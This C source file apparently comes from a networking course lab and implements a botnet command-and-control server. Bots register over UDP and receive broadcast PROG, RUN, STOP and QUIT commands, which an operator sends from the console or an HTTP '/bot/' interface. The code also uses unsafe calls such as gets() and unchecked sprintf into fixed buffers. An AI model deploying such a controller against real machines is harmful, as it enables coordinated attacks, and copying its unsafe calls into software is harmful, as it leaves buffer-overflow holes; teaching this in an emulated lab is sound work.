#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <fcntl.h>

#define DEF_UDP_PORT "5555"
#define DEF_STDIN 0
#define DEF_TCP_PORT "80"
#define BACKLOG 100

struct ip_port {
	char ip[INET_ADDRSTRLEN];
	char port[22];
};

struct MSG {
	char command;
	struct ip_port ip_and_port[20];
};

struct {
    char *ext;
    char *filetype;
} extensions [] = {
    { "gif",  "image/gif" },
    { "jpg",  "image/jpeg" },
    { "pdf", "text/pdf" },
    { "txt",  "text/txt" },
    { "html", "text/html" },
    {0,0}
};

struct sockaddr_in clients[100]; //polje registriranih klijenata

int Getaddrinfo(const char *hostname,const char *service,const struct addrinfo *hints,struct addrinfo **result){
	int err;
	if((err=getaddrinfo(hostname,service,hints,result)) != 0){
		errx(1,"%s",gai_strerror(err));
	}
	return err;
}

int Socket(int family,int type,int protocol){
	int err;
	if((err=socket(family,type,protocol)) < 0){
		errx(1,"%s",gai_strerror(err));
	}
	return err;
}

int Bind(int sockfd,const struct sockaddr *myaddr,int addrlen){
	int err;
	if((err=bind(sockfd,myaddr,addrlen)) < 0){
		errx(1,"%s",gai_strerror(err));
	}
	return err;
}

int find_max(int a, int b, int c){
	int max=a;
	if(b > max) max=b;
	if(c > max) max=c;
	return max;
}

ssize_t Recvfrom(int sockfd,void *buff,size_t nbytes,int flags,struct sockaddr *from,socklen_t *fromaddrlen){
	int err;
	if((err=recvfrom(sockfd,buff,nbytes,flags,from,fromaddrlen)) < 0){
		errx(1,"%s",gai_strerror(err));
	}
	return err;
}

ssize_t Sendto(int sockfd,void *buff,size_t nbytes,int flags,const struct sockaddr* to,socklen_t addrlen){
	int err;
	if((err=sendto(sockfd,buff,nbytes,flags,to,addrlen)) < 0){
		errx(1,"%s",gai_strerror(err));
	}
	return err;
} 

ssize_t Recv(int sockfd,void *buff,size_t nbytes,int flags){
	int err;
	if((err=recv(sockfd,buff,nbytes,flags)) < 0){
		errx(1,"%s",gai_strerror(err));
	}
	return err;
}

ssize_t Send(int sockfd,void *buff,size_t nbytes,int flags){
	int err;
	if((err=send(sockfd,buff,nbytes,flags)) < 0){
		errx(1,"%s",gai_strerror(err));
	}
	return err;
}

int Listen(int sockfd,int backlog){
	int err;
	if((err=listen(sockfd,backlog)) < 0){
		errx(1,"%s",gai_strerror(err));
	}
	return err;
}

int Accept(int sockfd,struct sockaddr *cliaddr,socklen_t *addrlen){
	int err;
	if((err=accept(sockfd,cliaddr,addrlen)) < 0){
		errx(1,"%s",gai_strerror(err));
	}
	return err;
}

void prog_tcp(int udp_sock){ // bot klijentima salje poruku PROG_TCP (struct MSG:1 10.0.0.20 1234\n)
	char MSGp[1+20*INET_ADDRSTRLEN+20*22]; 
	memset(MSGp,'\0',sizeof(MSGp));
	int count =0; //broji koliko ima registriranih klijenata
	for(int i=0; i < 100; i++){
		if(memcmp((const void *)&clients[i],(const void *)"\0",sizeof(char))){
				++count;
		}
	}
	struct MSG msg_pt;
	memset(&msg_pt,'\0',sizeof(msg_pt));
	msg_pt.command='1';
	struct ip_port ipport={"10.0.0.20","1234"};
	msg_pt.ip_and_port[0]=ipport;
	memcpy(MSGp,(const char *)&msg_pt,sizeof(msg_pt));
	struct sockaddr_in client;
	socklen_t clilen=sizeof(client);
	for(int i=0; i<count; i++){
		client = clients[i];
		Sendto(udp_sock,MSGp,1+INET_ADDRSTRLEN+22,0,(struct sockaddr *)&client,clilen);
		char ip[INET_ADDRSTRLEN];
		inet_ntop(AF_INET,&(client.sin_addr.s_addr),
									ip,sizeof(ip));
		printf("PROG_TCP: struct MSG:1 10.0.0.20 1234 -> %s %u\n",ip, ntohs(client.sin_port));
	}
}

void prog_tcp_localhost(int udp_sock){ // bot klijentima salje poruku PROG_TCP (struct MSG:1 127.0.0.1 1234\n)
	char MSGp[1+20*INET_ADDRSTRLEN+20*22]; 
	memset(MSGp,'\0',sizeof(MSGp));
	int count =0; //broji koliko ima registriranih klijenata
	for(int i=0; i < 100; i++){
		if(memcmp((const void *)&clients[i],(const void *)"\0",sizeof(char))){
				++count;
		}
	}
	struct MSG msg_pt;
	memset(&msg_pt,'\0',sizeof(msg_pt));
	msg_pt.command='1';
	struct ip_port ipport={"127.0.0.1","1234"};
	msg_pt.ip_and_port[0]=ipport;
	memcpy(MSGp,(const char *)&msg_pt,sizeof(msg_pt));
	struct sockaddr_in client;
	socklen_t clilen=sizeof(client);
	for(int i=0; i<count; i++){
		client = clients[i];
		Sendto(udp_sock,MSGp,1+INET_ADDRSTRLEN+22,0,(struct sockaddr *)&client,clilen);
		char ip[INET_ADDRSTRLEN];
		inet_ntop(AF_INET,&(client.sin_addr.s_addr),
							ip,sizeof(ip));
		printf("PROG_TCP: struct MSG:1 127.0.0.1 1234 -> %s %u\n",ip, ntohs(client.sin_port));
	}
}

void prog_udp(int udp_sock){ // bot klijentima salje poruku PROG_UDP (struct MSG:2 10.0.0.20 1234\n)
	char MSGp[1+20*INET_ADDRSTRLEN+20*22]; 
	memset(MSGp,'\0',sizeof(MSGp));
	int count =0; //broji koliko ima registriranih klijenata
	for(int i=0; i < 100; i++){
		if(memcmp((const void *)&clients[i],(const void *)"\0",sizeof(char))){
				++count;
		}
	}
	struct MSG msg_pt;
	memset(&msg_pt,'\0',sizeof(msg_pt));
	msg_pt.command='2';
	struct ip_port ipport={"10.0.0.20","1234"};
	msg_pt.ip_and_port[0]=ipport;
	memcpy(MSGp,(const char *)&msg_pt,sizeof(msg_pt));
	struct sockaddr_in client;
	socklen_t clilen=sizeof(client);
	for(int i=0; i<count; i++){
		client = clients[i];
		Sendto(udp_sock,MSGp,1+INET_ADDRSTRLEN+22,0,(struct sockaddr *)&client,clilen);
		char ip[INET_ADDRSTRLEN];
		inet_ntop(AF_INET,&(client.sin_addr.s_addr),
									ip,sizeof(ip));
		printf("PROG_UDP: struct MSG:2 10.0.0.20 1234 -> %s %u\n",ip, ntohs(client.sin_port));
	}
}

void prog_udp_localhost(int udp_sock){ // bot klijentima salje poruku PROG_UDP (struct MSG:2 127.0.0.1 1234\n)
	char MSGp[1+20*INET_ADDRSTRLEN+20*22]; 
	memset(MSGp,'\0',sizeof(MSGp));
	int count =0; //broji koliko ima registriranih klijenata
	for(int i=0; i < 100; i++){
		if(memcmp((const void *)&clients[i],(const void *)"\0",sizeof(char))){
				++count;
		}
	}
	struct MSG msg_pt;
	memset(&msg_pt,'\0',sizeof(msg_pt));
	msg_pt.command='2';
	struct ip_port ipport={"127.0.0.1","1234"};
	msg_pt.ip_and_port[0]=ipport;
	memcpy(MSGp,(const char *)&msg_pt,sizeof(msg_pt));
	struct sockaddr_in client;
	socklen_t clilen=sizeof(client);
	for(int i=0; i<count; i++){
		client = clients[i];
		Sendto(udp_sock,MSGp,1+INET_ADDRSTRLEN+22,0,(struct sockaddr *)&client,clilen);
		char ip[INET_ADDRSTRLEN];
		inet_ntop(AF_INET,&(client.sin_addr.s_addr),
									ip,sizeof(ip));
		printf("PROG_UDP: struct MSG:2 127.0.0.1 1234 -> %s %u\n",ip, ntohs(client.sin_port));
	}
}

void run(int udp_sock){ // bot klijentima salje poruku RUN s adresama lokalnog računala:
										// struct MSG:3 127.0.0.1 vat localhost 6789\n
	char MSGp[1+20*INET_ADDRSTRLEN+20*22]; 
	memset(MSGp,'\0',sizeof(MSGp));
	int count =0; //broji koliko ima registriranih klijenata
	for(int i=0; i < 100; i++){
		if(memcmp((const void *)&clients[i],(const void *)"\0",sizeof(char))){
				++count;
		}
	}
	struct MSG msg_pt;
	memset(&msg_pt,'\0',sizeof(msg_pt));
	msg_pt.command='3';
	struct ip_port ipport1={"127.0.0.1","vat"};
	msg_pt.ip_and_port[0]=ipport1;
	struct ip_port ipport2={"localhost","6789"};
	msg_pt.ip_and_port[1]=ipport2;
	memcpy(MSGp,(const char *)&msg_pt,sizeof(msg_pt));
	struct sockaddr_in client;
	socklen_t clilen=sizeof(client);
	for(int i=0; i<count; i++){
		client = clients[i];
		Sendto(udp_sock,MSGp,1+INET_ADDRSTRLEN*2+22*2,0,(struct sockaddr *)&client,clilen);
		char ip[INET_ADDRSTRLEN];
		inet_ntop(AF_INET,&(client.sin_addr.s_addr),
									ip,sizeof(ip));
		printf("RUN: struct MSG:3 127.0.0.1 vat localhost 6789 -> %s %u\n",ip, ntohs(client.sin_port));
	}
}

void run2(int udp_sock){ // bot klijentima salje poruku RUN s adresama računala iz IMUNES-a:
										// struct MSG:3 20.0.0.11 1111 20.0.0.12 2222 20.0.0.13 dec-notes
	char MSGp[1+20*INET_ADDRSTRLEN+20*22]; 
	memset(MSGp,'\0',sizeof(MSGp));
	int count =0; //broji koliko ima registriranih klijenata
	for(int i=0; i < 100; i++){
		if(memcmp((const void *)&clients[i],(const void *)"\0",sizeof(char))){
				++count;
		}
	}
	struct MSG msg_pt;
	memset(&msg_pt,'\0',sizeof(msg_pt));
	msg_pt.command='3';
	struct ip_port ipport1={"20.0.0.11","1111"};
	msg_pt.ip_and_port[0]=ipport1;
	struct ip_port ipport2={"20.0.0.12","2222"};
	msg_pt.ip_and_port[1]=ipport2;
	struct ip_port ipport3={"20.0.0.13","dec-notes"};
	msg_pt.ip_and_port[2]=ipport3;
	memcpy(MSGp,(const char *)&msg_pt,sizeof(msg_pt));
	struct sockaddr_in client;
	socklen_t clilen=sizeof(client);
	for(int i=0; i<count; i++){
		client = clients[i];
		Sendto(udp_sock,MSGp,1+INET_ADDRSTRLEN*3+22*3,0,(struct sockaddr *)&client,clilen);
		char ip[INET_ADDRSTRLEN];
		inet_ntop(AF_INET,&(client.sin_addr.s_addr),
									ip,sizeof(ip));
		printf("RUN: struct MSG:3 20.0.0.11 1111 20.0.0.12 2222 20.0.0.13 dec-notes -> %s %u\n",ip, ntohs(client.sin_port));
	}
}

void stop(int udp_sock){ // bot klijentima salje poruku STOP (struct MSG:4)
	char MSGp[1+20*INET_ADDRSTRLEN+20*22]; 
	memset(MSGp,'\0',sizeof(MSGp));
	int count =0; //broji koliko ima registriranih klijenata
	for(int i=0; i < 100; i++){
		if(memcmp((const void *)&clients[i],(const void *)"\0",sizeof(char))){
				++count;
		}
	}
	struct MSG msg_pt;
	memset(&msg_pt,'\0',sizeof(msg_pt));
	msg_pt.command='4';
	memcpy(MSGp,(const char *)&msg_pt,sizeof(msg_pt));
	struct sockaddr_in client;
	socklen_t clilen=sizeof(client);
	for(int i=0; i<count; i++){
		client = clients[i];
		Sendto(udp_sock,MSGp,1,0,(struct sockaddr *)&client,clilen);
		char ip[INET_ADDRSTRLEN];
		inet_ntop(AF_INET,&(client.sin_addr.s_addr),
									ip,sizeof(ip));
		printf("PROG_UDP: struct MSG:4 -> %s %u\n",ip, ntohs(client.sin_port));
	}
}

void list(){ // lokalni ispis adresa bot klijenata (registriranih)
	int count =0; //broji koliko ima registriranih klijenata
	for(int i=0; i < 100; i++){
		if(memcmp((const void *)&clients[i],(const void *)"\0",sizeof(char))){
				++count;
		}
	}
	struct sockaddr_in client;
	printf("registrirani klijenti:\n");
	for(int i=0; i<count; i++){
		client = clients[i];
		char ip[INET_ADDRSTRLEN];
		inet_ntop(AF_INET,&(client.sin_addr.s_addr),
									ip,sizeof(ip));
		printf("%s %u\n",ip, ntohs(client.sin_port));
	}
	printf("\n");
}

void quit(int udp_sock){ // bot klijentima salje poruku QUIT i zavrsava s radom (struct MSG:0)
	char MSGp[1+20*INET_ADDRSTRLEN+20*22]; 
	memset(MSGp,'\0',sizeof(MSGp));
	int count =0; //broji koliko ima registriranih klijenata
	for(int i=0; i < 100; i++){
		if(memcmp((const void *)&clients[i],(const void *)"\0",sizeof(char))){
				++count;
		}
	}
	struct MSG msg_pt;
	memset(&msg_pt,'\0',sizeof(msg_pt));
	msg_pt.command='0';
	memcpy(MSGp,(const char *)&msg_pt,sizeof(msg_pt));
	struct sockaddr_in client;
	socklen_t clilen=sizeof(client);
	for(int i=0; i<count; i++){
		client = clients[i];
		Sendto(udp_sock,MSGp,1,0,(struct sockaddr *)&client,clilen);
		char ip[INET_ADDRSTRLEN];
		inet_ntop(AF_INET,&(client.sin_addr.s_addr),
									ip,sizeof(ip));
		printf("PROG_UDP: struct MSG:0 -> %s %u\n",ip, ntohs(client.sin_port));
	}
	exit(0);
}

void web(int fd,int udp_sock) {
	int file_fd;
    char buffer[8096*2];
	memset(buffer,0,sizeof(buffer));

    int ret=Recv(fd,buffer,sizeof(buffer),0);	//citanje zahtjeva
    printf("zahtjev:\n%s\n",buffer);
    if (ret > 0 && ret < sizeof(buffer))	//dobar zahtjev
	buffer[ret] = 0;	//terminiramo buffer
    else
	buffer[0] = 0;

    for (int i = 0; i < ret; i++)	//micemo CF i LF
	if (buffer[i] == '\r' || buffer[i] == '\n')
	    buffer[i] = '*';
    //printf("zahtjev:\n%s\n",buffer);

    if (strncmp(buffer, "GET ", 4) && strncmp(buffer, "get ", 4)) { //samo GET prihvaca
		char buffer1[8096*2];
		memset(buffer1,0,sizeof(buffer1));
		sprintf(buffer1, "HTTP/1.0 405 Method Not Allowed\r\n\r\n");
		Send(fd,buffer1,strlen(buffer1),0);
		return;
	}

	int url_length=0;
    for (int i = 4; i < sizeof(buffer); i++) {	
		if (buffer[i] == ' ') {	//terminiramo sa 0 nakon GET URL
			buffer[i] = 0;
			break;
		}
		url_length++;
    }
    
    //printf("%d\n",url_length);
    //printf("zahtjev:\n%s\n",buffer);
    
    if(url_length > 4){ //mora biti min 5 jer /bot/, ako manji onda sigurno nije naredba
		if(! strncmp(&buffer[4], "/bot/", 5)) { //zadana je naredba
			char buffer1[8096*2];
			memset(buffer1,0,sizeof(buffer1));
			if(! strncmp(&buffer[8], "/run", 4)) {
				run(udp_sock);
				sprintf(buffer1, "HTTP/1.0 200 OK (run)\r\n\r\n");
				Send(fd,buffer1,strlen(buffer1),0);
				return;
			}
			if(! strncmp(&buffer[8], "/run2", 5)) {
				run2(udp_sock);
				sprintf(buffer1, "HTTP/1.0 200 OK (run2)\r\n\r\n");
				Send(fd,buffer1,strlen(buffer1),0);
				return;
			}
			if(! strncmp(&buffer[8], "/stop", 5)) {
				stop(udp_sock);
				sprintf(buffer1, "HTTP/1.0 200 OK (stop)\r\n\r\n");
				Send(fd,buffer1,strlen(buffer1),0);
				return;
			}
			if(! strncmp(&buffer[8], "/list", 5)) {
				list();
				sprintf(buffer1, "HTTP/1.0 200 OK (list)\r\nContent-Type: text/html\r\n\r\n");
				Send(fd,buffer1,strlen(buffer1),0);
				int count =0; //broji koliko ima registriranih klijenata
				for(int i=0; i < 100; i++){
					if(memcmp((const void *)&clients[i],(const void *)"\0",sizeof(char))){
					++count;
					}
				}
				struct sockaddr_in client;
				memset(buffer1,0,sizeof(buffer1));
				for(int i=0; i<count; i++){
					client = clients[i];
					char ip[INET_ADDRSTRLEN];
					inet_ntop(AF_INET,&(client.sin_addr.s_addr),
									ip,sizeof(ip));
					sprintf(buffer1 + strlen(buffer1),"%s %u\n",
														ip, ntohs(client.sin_port));
				}
				char buffer2[8096*2];
				memset(buffer2,0,sizeof(buffer2));
				sprintf(buffer2, "<html> <head>  <title>!</title>  </head> <body> <h1>%s</h1> </body> </html>\r\n\r\n",buffer1);
				Send(fd,buffer2,strlen(buffer2),0);
				return;
			}
			if(! strncmp(&buffer[8], "/quit", 5)) {
				quit(udp_sock);
				sprintf(buffer1, "HTTP/1.0 200 OK (quit)\r\n\r\n");
				Send(fd,buffer1,strlen(buffer1),0);
				return;
			}
			if(! strncmp(&buffer[8], "/prog_tcp_localhost", 19)) {
				prog_tcp_localhost(udp_sock);
				sprintf(buffer1, "HTTP/1.0 200 OK (prog_tcp_localhost)\r\n\r\n");
				Send(fd,buffer1,strlen(buffer1),0);
				return;
			}
			if(! strncmp(&buffer[8], "/prog_udp_localhost", 19)) {
				prog_udp_localhost(udp_sock);
				sprintf(buffer1, "HTTP/1.0 200 OK (prog_udp_localhost)\r\n\r\n");
				Send(fd,buffer1,strlen(buffer1),0);
				return;
			}
			if(! strncmp(&buffer[8], "/prog_udp", 9)) {
				prog_udp(udp_sock);
				sprintf(buffer1, "HTTP/1.0 200 OK (prog_udp)\r\n\r\n");
				Send(fd,buffer1,strlen(buffer1),0);
				return;
			}
			if(! strncmp(&buffer[8], "/prog_tcp", 9)) {
				prog_tcp(udp_sock);
				sprintf(buffer1, "HTTP/1.0 200 OK (prog_tcp)\r\n\r\n");
				Send(fd,buffer1,strlen(buffer1),0);
				return;
			}
			sprintf(buffer1, "HTTP/1.0 405 Wrong command\r\n\r\n");
			Send(fd,buffer1,strlen(buffer1),0);
			return;
		}
	}
    
    int current=1;
    for (int i=5; i < url_length + 5 - 1; i++){
		if(buffer[i] == '/') {
			current=0;
		}
	}
	if(current == 0){
		char buffer1[8096*2];
		memset(buffer1,0,sizeof(buffer1));
		sprintf(buffer1, "HTTP/1.0 400 File is not from current directory\r\n\r\n");
		Send(fd,buffer1,strlen(buffer1),0);
		return;
	}

    if (!strncmp(&buffer[0],"GET /\0", 6) || !strncmp(&buffer[0],"get /\0", 6)){
	//ako nema odredeni fajl vraca index.html
		strcpy(buffer, "GET /index.html");
    }

    //provjeravamo tip datoteke
    int buflen = strlen(buffer);
    char *fstr = (char *)0;
    for (int i = 0; extensions[i].ext != 0; i++) {
	int len = strlen(extensions[i].ext);
	if (!strncmp(&buffer[buflen - len], extensions[i].ext, len)) {
	    fstr = extensions[i].filetype;
	    break;
	}
    }
    if (fstr == 0) {
		char buffer1[8096*2];
		memset(buffer1,0,sizeof(buffer1));
		sprintf(buffer1, "HTTP/1.0 400 Not Allowed extensions\r\n\r\n");
		Send(fd,buffer1,strlen(buffer1),0); 
		return;
	}

    if ((file_fd = open(&buffer[5],O_RDONLY)) == -1) { //otvori za citanje
		char buffer1[8096*2];
		memset(buffer1,0,sizeof(buffer1));
		sprintf(buffer1, "HTTP/1.0 500 File is not readable\r\n\r\n");
		Send(fd,buffer1,strlen(buffer1),0); 
		return;
	}

	printf("posluzitelj salje %s\n",&buffer[5]);

    sprintf(buffer, "HTTP/1.0 200 OK\r\nContent-Type: %s\r\n\r\n",fstr);
    Send(fd,buffer,strlen(buffer),0); 

    /* send file in 8KB block - last block may be smaller */
    while ((ret = read(file_fd, buffer, sizeof(buffer))) > 0) {
		Send(fd,buffer,ret,0); 
    }
}

int Setsockopt(int sockfd,int level,int optname,const void *opval,socklen_t optlen){
	int err;
	if((err=setsockopt(sockfd,level,optname,opval,optlen)) < 0){
		errx(1,"%s",gai_strerror(err));
	}
	return err;
} 

int main(int argc, char *argv[]) {
	if(argc < 1){
		fprintf(stderr,"Usage: ./CandC [tcp_port]\n");
		exit(1);
	}
	
	char udp_port[22]=DEF_UDP_PORT; //naziv ili broj UDP porta na kojem slusa 
	char tcp_port[22]=DEF_TCP_PORT; //naziv ili broj TCP porta na kojem slusa C&C posluzitelj
	if(argc == 2) strcpy(tcp_port,argv[argc-1]);
	
	int udp_sock;
	int tcp_sock;
	int stdin_des=DEF_STDIN; // STDIN deskriptor
	
	struct addrinfo hints1; // radimo strukturu adrese za UDP port
	struct addrinfo *res1;
	memset(&hints1,0,sizeof(hints1));
	hints1.ai_family=AF_INET;
	hints1.ai_socktype=SOCK_DGRAM;
	hints1.ai_flags=AI_PASSIVE;
	Getaddrinfo(NULL,udp_port,&hints1,&res1);
	udp_sock=Socket(res1->ai_family,res1->ai_socktype,res1->ai_protocol); // postavljamo socket za UDP
	Bind(udp_sock,res1->ai_addr,res1->ai_addrlen); // povezujemo socket i adresu
	
	struct addrinfo hints2; // radimo strukturu adrese za TCP port
	struct addrinfo *res2;
	memset(&hints2,0,sizeof(hints2));
	hints2.ai_family=AF_INET;
	hints2.ai_socktype=SOCK_STREAM;
	hints2.ai_flags=AI_PASSIVE;
	Getaddrinfo(NULL,tcp_port,&hints2,&res2);
	tcp_sock=Socket(res2->ai_family,res2->ai_socktype,res2->ai_protocol); // postavljamo socket za TCP
	Bind(tcp_sock,res2->ai_addr,res2->ai_addrlen); // povezujemo socket i adresu
	Setsockopt(tcp_sock,SOL_SOCKET,SO_REUSEADDR,&(int){ 1 },sizeof(int));
	Listen(tcp_sock,BACKLOG); 
	
	int max=find_max(tcp_sock,udp_sock,stdin_des);
	
	fd_set readfds; // skup deskriptora koje zelimo citati
	
	memset(&clients,'\0',sizeof(clients));
	int i=0;//s njime idemo po polju clients
	
	while(1){
		
		struct timeval tv; // vrijeme blokiranja
		FD_ZERO(&readfds); // ocistimo skup
		FD_SET(udp_sock, &readfds); // dodajemo deskriptore koje zelimo nadzirati
		FD_SET(tcp_sock, &readfds);
		FD_SET(stdin_des, &readfds);
		tv.tv_sec = 3;
		tv.tv_usec = 500000;
		int rv = select(max+1, &readfds, NULL, NULL, &tv);
		if (rv == -1) {
			perror("select");
		}
		if (FD_ISSET(udp_sock, &readfds)) {
			struct sockaddr_in client;
			socklen_t clilen=sizeof(client);
			char buffer[256];
			memset(buffer,0,sizeof(buffer));
			Recvfrom(udp_sock,buffer,sizeof(buffer),0,(struct sockaddr *)&client,&clilen);
			printf("primljeno preko udp:\n%s",buffer);
			if(! strcmp(buffer,"REG\n")){
				clients[i]=client;
				char ip[INET_ADDRSTRLEN];
				inet_ntop(AF_INET,&(client.sin_addr.s_addr),
					ip,sizeof(ip));
				printf("registrirao se:\n%s %u\n\n",ip,ntohs(client.sin_port));
				i++;
			}
		}
		if (FD_ISSET(tcp_sock, &readfds)) {
			pid_t pid;
			struct sockaddr_in client;
			socklen_t clilen;
			clilen = sizeof client;
			int newsock=Accept(tcp_sock,(struct sockaddr *)&client,&clilen); 
			char ip[INET_ADDRSTRLEN];
			inet_ntop(AF_INET,&(client.sin_addr.s_addr),
					ip,sizeof(ip));
			printf("spojio se tcp klijent:\n%s %u\n\n",ip,ntohs(client.sin_port));
			if ((pid = fork()) < 0) {
				exit(1);
			} 
			else {
				if (pid == 0) {	//dijete
					close(tcp_sock); //dijete ne ceka nove konekcije
					web(newsock,udp_sock);	
					close(newsock); //obrada gotova
					exit(0); //dijete gotovo
				}
				else {		//roditelj
					close(newsock); //posao je predao dijetetu
				}
			}
		}
		if (FD_ISSET(stdin_des, &readfds)) {
			char buffer[256];
			gets(buffer);
			printf("primljeno preko stdin:\n%s\n",buffer);
				
			if(! strcmp(buffer,"pt")){ // bot klijentima salje poruku PROG_TCP (struct MSG:1 10.0.0.20 1234\n)
				prog_tcp(udp_sock);
			}
			if(! strcmp(buffer,"ptl")){ // bot klijentima salje poruku PROG_TCP (struct MSG:1 127.0.0.1 1234\n)
				prog_tcp_localhost(udp_sock);
			}
			if(! strcmp(buffer,"pu")){ // bot klijentima salje poruku PROG_UDP (struct MSG:2 10.0.0.20 1234\n)
				prog_udp(udp_sock);
			}
			if(! strcmp(buffer,"pul")){ // bot klijentima salje poruku PROG_UDP (struct MSG:2 127.0.0.1 1234\n)
				prog_udp_localhost(udp_sock);
			}
			if(! strcmp(buffer,"r")){ // bot klijentima salje poruku RUN s adresama lokalnog računala:
										// struct MSG:3 127.0.0.1 vat localhost 6789\n
				run(udp_sock);
			}
			if(! strcmp(buffer,"r2")){ // bot klijentima salje poruku RUN s adresama računala iz IMUNES-a:
										// struct MSG:3 20.0.0.11 1111 20.0.0.12 2222 20.0.0.13 dec-notes
				run2(udp_sock);
			}
			if(! strcmp(buffer,"s")){ // bot klijentima salje poruku STOP (struct MSG:4)
				stop(udp_sock);
			}
			if(! strcmp(buffer,"l")){ // lokalni ispis adresa bot klijenata (registriranih)
				list();
			}
			if(! strcmp(buffer,"n")){ // salje poruku: 'NEPOZNATA'\n
				printf("NEPOZNATA\n");
				printf("\n");
			}
			if(! strcmp(buffer,"q")){ // bot klijentima salje poruku QUIT i zavrsava s radom (struct MSG:0)
				quit(udp_sock);
			}
			if(! strcmp(buffer,"h")){ // ispis naredbi
				printf("Stdin	Opis\n");
				printf("pt	bot klijentima salje poruku PROG_TCP (struct MSG:1 10.0.0.20 1234)\n");
				printf("ptl	bot klijentima salje poruku PROG_TCP (struct MSG:1 127.0.0.1 1234)\n");
				printf("pu	bot klijentima salje poruku PROG_UDP (struct MSG:2 10.0.0.20 1234)\n");
				printf("pul	bot klijentima salje poruku PROG_UDP (struct MSG:2 127.0.0.1 1234)\n");
				printf("r	bot klijentima salje poruku RUN s adresama lokalnog racunala: struct MSG:3 127.0.0.1 vat localhost 6789\n");
				printf("r2	bot klijentima salje poruku RUN s adresama racunala iz IMUNES-a: struct MSG:3 20.0.0.11 1111 20.0.0.12 2222 20.0.0.13 dec-notes\n");
				printf("s	bot klijentima salje poruku STOP (struct MSG:4)\n");
				printf("l	lokalni ispis adresa bot klijenata\n");
				printf("n	salje poruku: 'NEPOZNATA'\n");
				printf("q	bot klijentima salje poruku QUIT i zavrsava s radom (struct MSG:0)\n");
				printf("h	ispis naredbi\n");
				printf("\n");
			}
		}
	}
	
}
